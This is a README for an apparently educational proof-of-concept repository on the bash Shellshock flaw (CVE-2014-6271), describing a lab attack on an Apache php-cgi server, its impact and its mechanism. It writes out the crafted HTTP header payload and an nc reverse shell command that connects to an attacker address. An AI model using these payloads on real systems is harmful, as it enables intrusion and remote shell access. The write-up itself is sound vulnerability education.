RBE
===

Remote Bash Execution

This POC (proof of concept) is for EDUCATIONAL PURPOSES ONLY! Please, do not use it with wrong intents in mind.

We set up a simple PHP website and a Python executable that exploits the [bash shellshock vulnerability](http://arstechnica.com/security/2014/09/bug-in-bash-shell-creates-big-security-hole-on-anything-with-nix-in-it/).


Development
=============
Please note that all the following tests were done in a local controlled environment for educational purposes only. Do NOT do this at home!
- Initially, we tested the vulnerability on our environments with the following command (see the link above for the source): 
 
 `env x='() { :;}; echo vulnerable' bash -c "echo this is a test`

- Next, we set up an http server on a CentOS machine with Apache and php-cgi running a very simple script (see index.php). The JOY when it worked!

- We started out by sending simple crafted HTTP packets that echoed text (inspired by [this blog post](http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html#.VCNinnVdW00).

- We then tested more elaborate commands to discover what we had acces to. In our case, typing the command names as an apache user would not resolve the commands, yet calling them explicitly (`/usr/bin/command`) worked. We were able to run `find` commands and see all the files we had access to.

- At this point, it was annoying to type the commands individually. Fortunately, `nc` was installed on the server, so we used a reverse bind shell (`nc -lvp xxx` for the attacker and `nc -e /usr/bin/sh atckr_addr port`) for flexibility. At this point, we had a shell on the system, but running as apache user, all through a single HTTP packet with the right (or wrong?) headers.

- To simplify the process, we made a python script (in this repo) that calls netcat automatically.

Impact
======
With a shell on the victim's computer (limited as much as the apache user is on the machine), here is what we believe an attacker could do at this point:

- In our case, we only had write access to /tmp (which was actually a subdirectory within the real /tmp), so no straightforward way for a permanent backdoor.

- We had access to the source code, which could be leaked afterwards.

- Although we did not had the proper setup to try it, we think the attacker could reach the SSL keys (even easier than Heartbleed!)

- Depending on the setup (and knowledge of the attacker), one could privilege escalate and break the apache jail.

- Once inside, we can easily DDoS the system (which can hurt companies). We experienced this ourselves by playing around with `cat /dev/urandom/ > file`.

- We can DDoS another target (the initial target most likely has more firepower than an average system).

- We had access to the LAN, which could give access to new computers behind the firewall.

We probably are missing many other potential attack vectors here, but that is what we observed given a one-night hack-a-ton.

Therefore, we can see the major impact that CVE-2014-6271 ("shellshock") has.

The Exploit
===========
Given our limited knowledge of bash internals and the short time window that we had, here is what we understood of the exploit:

- When bash reads an environment variable containing a specially crafted function (i.e. `() { :; };`), it also executes the commands following the function definition (e.g. `echo hacked`).

- This can not really be exploited remotely by itself, it needs software that takes user input as a source for environment variable values.

- So, when php-cgi is started by Apache through bash (which looks like the default behavior), certain HTTP headers are passed through env (e.g. referer, host and cookies). Our research indicates that other CGIs that don't pass these values through env (e.g. FastCGI communicates through sockets) are not affected (we tested it!)

- Now, given carefully crafted HTTP headers (such as `() { :; }; echo hacked`), the next instruction through bash (e.g. a PHP `exec()`) will trigger the vulnerability.

Conclusion
==========
Finally, this was a very entertaining and rewarding experience. We clearly saw how dangerous this vulnerability is. For example, we have read about other software than Apache that can be used to exploit bash, such as DHCP clients. A clever attacker could start a malicious DHCP server in proximity of the victims and gain root access on the systems (as the dhcp client will execute the command as root).

Interestingly, we were surprised while testing the exploit: our reverse bind shell through nc was not interrupted when the connection with Apache is timed out. We expected the connection to be closed, but the actual behavior ended up being convenient.

We want to emphasize the fact that this was for educational purposes only. Please do not use with malicious intent.


This analysis was brought to you by [/JesseEmond](https://github.com/JesseEmond) and [/Parasithe](https://github.com/Parasithe).
